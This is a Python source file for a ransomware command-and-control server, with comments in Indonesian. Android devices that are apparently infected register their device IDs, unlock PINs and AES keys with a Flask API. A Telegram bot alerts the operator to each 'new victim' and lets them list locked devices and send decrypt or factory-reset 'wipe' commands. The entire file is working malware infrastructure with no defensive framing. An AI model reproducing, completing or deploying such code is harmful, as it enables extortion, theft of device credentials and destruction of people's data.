import os
import json
import sqlite3
import asyncio
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ========== KONFIGURASI ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "0"))  # Chat ID lo
PORT = int(os.environ.get("PORT", 8080))

# ========== DATABASE SETUP ==========
DB_PATH = "c2_data.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        device_id TEXT PRIMARY KEY,
        pin TEXT,
        aes_key TEXT,
        model TEXT,
        android_version TEXT,
        first_seen TEXT,
        last_active TEXT,
        progress INTEGER DEFAULT 0,
        is_locked INTEGER DEFAULT 1,
        status TEXT DEFAULT 'encrypted'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        command TEXT,
        issued_at TEXT,
        executed INTEGER DEFAULT 0
    )''')
    conn.commit()
    conn.close()

init_db()

# ========== FLASK APP ==========
app = Flask(__name__)

# ========== TELEGRAM BOT ==========
telegram_app = None
bot_instance = None

# ---------- ENDPOINT UNTUK ANDROID ----------
@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data:
        return jsonify({"error": "no data"}), 400
    
    device_id = data.get('device_id')
    pin = data.get('pin')
    aes_key = data.get('aes_key')
    model = data.get('model')
    android_version = data.get('android_version')
    
    if not device_id:
        return jsonify({"error": "device_id required"}), 400
    
    now = datetime.now().isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO victims 
        (device_id, pin, aes_key, model, android_version, first_seen, last_active, is_locked)
        VALUES (?, ?, ?, ?, ?, ?, ?, 1)''',
        (device_id, pin, aes_key, model, android_version, now, now))
    conn.commit()
    conn.close()
    
    # Kirim notifikasi ke Telegram (async)
    asyncio.create_task(notify_admin_new_victim(device_id, pin, model))
    
    return jsonify({"status": "ok"})

@app.route('/status', methods=['POST'])
def status():
    data = request.get_json()
    device_id = data.get('device_id')
    progress = data.get('progress')
    is_locked = data.get('is_locked')
    
    if not device_id:
        return jsonify({"error": "device_id required"}), 400
    
    now = datetime.now().isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''UPDATE victims SET last_active=?, progress=?, is_locked=?
                 WHERE device_id=?''', (now, progress, is_locked, device_id))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

@app.route('/command/<device_id>', methods=['GET'])
def get_command(device_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    # Ambil command yang belum dieksekusi, urutkan dari yang paling lama
    c.execute('''SELECT command FROM commands 
                 WHERE device_id=? AND executed=0
                 ORDER BY id ASC LIMIT 1''', (device_id,))
    row = c.fetchone()
    if row:
        command = row[0]
        # Tandai sebagai sudah dikirim (belum di-execute, tapi kita anggap sudah)
        c.execute('UPDATE commands SET executed=1 WHERE device_id=? AND command=?', (device_id, command))
        conn.commit()
        conn.close()
        return jsonify({"command": command})
    conn.close()
    return jsonify({"command": None})

# ---------- TELEGRAM BOT COMMANDS ----------
async def notify_admin_new_victim(device_id, pin, model):
    if not telegram_app or ADMIN_CHAT_ID == 0:
        return
    text = f"🔴 *NEW VICTIM*\n\n"
    text += f"Device ID: `{device_id}`\n"
    text += f"PIN: `{pin}`\n"
    text += f"Model: {model}\n"
    text += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    await telegram_app.bot.send_message(chat_id=ADMIN_CHAT_ID, text=text, parse_mode='Markdown')

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        await update.message.reply_text("⛔ Unauthorized")
        return
    keyboard = [
        [InlineKeyboardButton("📊 List Victims", callback_data='list_victims')],
        [InlineKeyboardButton("📈 Statistics", callback_data='stats')],
        [InlineKeyboardButton("🔓 Decrypt Victim", callback_data='decrypt_menu')],
        [InlineKeyboardButton("💀 Wipe Victim", callback_data='wipe_menu')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🤖 *C2 Dashboard*\nSelect action:", reply_markup=reply_markup, parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == 'list_victims':
        await list_victims(query)
    elif data == 'stats':
        await show_stats(query)
    elif data == 'decrypt_menu':
        await decrypt_menu(query)
    elif data == 'wipe_menu':
        await wipe_menu(query)
    elif data.startswith('decrypt_'):
        device_id = data.split('_')[1]
        await issue_command(device_id, "decrypt")
        await query.edit_message_text(f"✅ Decrypt command sent to `{device_id}`", parse_mode='Markdown')
    elif data.startswith('wipe_'):
        device_id = data.split('_')[1]
        await issue_command(device_id, "wipe")
        await query.edit_message_text(f"⚠️ WIPE command sent to `{device_id}`", parse_mode='Markdown')
    elif data == 'back':
        await start(update, context)

async def list_victims(query):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT device_id, pin, progress, is_locked, last_active FROM victims ORDER BY last_active DESC")
    rows = c.fetchall()
    conn.close()
    if not rows:
        await query.edit_message_text("No victims registered.")
        return
    text = "*📋 VICTIMS*\n\n"
    for row in rows:
        device_id, pin, prog, locked, last = row
        status = "🔒" if locked else "🔓"
        text += f"{status} `{device_id}`\n"
        text += f"   PIN: {pin} | Progress: {prog}%\n"
        text += f"   Last: {last[:16]}\n\n"
    keyboard = [[InlineKeyboardButton("◀ Back", callback_data='back')]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def show_stats(query):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM victims")
    total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM victims WHERE is_locked=1")
    locked = c.fetchone()[0]
    c.execute("SELECT AVG(progress) FROM victims")
    avg_prog = c.fetchone()[0] or 0
    conn.close()
    text = f"📊 *STATISTICS*\n\n"
    text += f"Total victims: {total}\n"
    text += f"Locked: {locked}\n"
    text += f"Avg progress: {int(avg_prog)}%\n"
    keyboard = [[InlineKeyboardButton("◀ Back", callback_data='back')]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def decrypt_menu(query):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT device_id FROM victims WHERE is_locked=1")
    rows = c.fetchall()
    conn.close()
    if not rows:
        await query.edit_message_text("No locked victims.")
        return
    keyboard = []
    for row in rows:
        keyboard.append([InlineKeyboardButton(f"🔓 {row[0][:12]}...", callback_data=f'decrypt_{row[0]}')])
    keyboard.append([InlineKeyboardButton("◀ Back", callback_data='back')])
    await query.edit_message_text("Select victim to DECRYPT:", reply_markup=InlineKeyboardMarkup(keyboard))

async def wipe_menu(query):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT device_id FROM victims WHERE is_locked=1")
    rows = c.fetchall()
    conn.close()
    if not rows:
        await query.edit_message_text("No locked victims.")
        return
    keyboard = []
    for row in rows:
        keyboard.append([InlineKeyboardButton(f"💀 {row[0][:12]}... (DANGER)", callback_data=f'wipe_{row[0]}')])
    keyboard.append([InlineKeyboardButton("◀ Back", callback_data='back')])
    await query.edit_message_text("⚠️ *DANGER ZONE* - Select victim to WIPE (factory reset):", 
                                  reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def issue_command(device_id, command):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    now = datetime.now().isoformat()
    c.execute("INSERT INTO commands (device_id, command, issued_at, executed) VALUES (?, ?, ?, 0)",
              (device_id, command, now))
    conn.commit()
    conn.close()

async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id == ADMIN_CHAT_ID:
        await update.message.reply_text("Unknown command. Use /start")

# ---------- RUN FLASK + TELEGRAM ----------
def run_flask():
    app.run(host='0.0.0.0', port=PORT)

async def run_telegram():
    global telegram_app
    telegram_app = Application.builder().token(BOT_TOKEN).build()
    telegram_app.add_handler(CommandHandler("start", start))
    telegram_app.add_handler(CallbackQueryHandler(button_handler))
    telegram_app.add_handler(CommandHandler("help", start))
    telegram_app.add_handler(CommandHandler("unknown", unknown_command))
    await telegram_app.initialize()
    await telegram_app.start()
    await telegram_app.updater.start_polling()
    # Keep running
    while True:
        await asyncio.sleep(3600)

if __name__ == '__main__':
    import threading
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()
    asyncio.run(run_telegram())